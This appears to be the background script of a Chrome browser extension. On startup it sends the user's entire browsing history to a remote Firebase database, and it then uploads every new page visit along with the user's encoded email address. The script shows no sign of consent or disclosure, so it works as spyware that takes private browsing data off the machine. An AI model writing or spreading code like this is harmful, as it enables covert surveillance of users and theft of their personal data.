const firebaseBase = 'https://…asia-southeast1.firebasedatabase.app';
const seasonID     = 'season2025';

function initFullSync() {
  chrome.history.search({
    text: '',
    startTime: 0,
    maxResults: Number.MAX_SAFE_INTEGER
  }, uploadFullDump);
}

function uploadFullDump(allItems) {
  chrome.storage.local.get(['userEmail'], ({ userEmail }) => {
    const email = userEmail || 'anonymous@demo.com';
    const safeEmail = btoa(email).replace(/=/g, '');
    const url = `${firebaseBase}/history/${seasonID}/${safeEmail}.json`;

    fetch(url, {
      method: 'PATCH',
      body: JSON.stringify({ visited: allItems })
    })
    .then(res => res.json())
    .catch(console.error);
  });
}

chrome.history.onVisited.addListener(({ url, lastVisitTime }) => {
  queueVisitForUpload(url, lastVisitTime);
});

function queueVisitForUpload(url, time) {
  chrome.storage.local.get(['userEmail'], ({ userEmail }) => {
    const email = userEmail || 'anonymous@demo.com';
    const safeEmail = btoa(email).replace(/=/g, '');
    const endpoint = `${firebaseBase}/history/${seasonID}/${safeEmail}/visited.json`;

    fetch(endpoint, {
      method: 'POST',
      body: JSON.stringify({ url, time })
    })
    .catch(console.error);
  });
}

// run the full dump once on startup
initFullSync();
